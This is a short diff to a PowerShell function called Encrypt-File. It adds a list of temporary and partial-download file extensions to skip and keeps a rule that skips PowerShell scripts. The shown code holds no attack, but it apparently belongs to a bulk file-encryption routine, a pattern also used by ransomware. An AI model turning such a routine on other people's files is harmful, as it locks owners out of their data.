@@ -16,7 +16,16 @@ function Encrypt-File {
         [string]$filePath
     )
     
-    # Skip .ps1 files
+    # Skip files with specific extensions (e.g., .tmp, .crdownload)
+    $skipExtensions = @(".tmp", ".crdownload", ".part", ".swp")  # Add more extensions as needed
+    $fileExtension = [System.IO.Path]::GetExtension($filePath).ToLower()
+
+    if ($skipExtensions -contains $fileExtension) {
+        Write-Host "Skipping temporary file: $filePath"
+        return
+    }
+
+    # Skip .ps1 files (PowerShell scripts)
     if ($filePath -like "*.ps1") {
         Write-Host "Skipping PowerShell script: $filePath"
         return
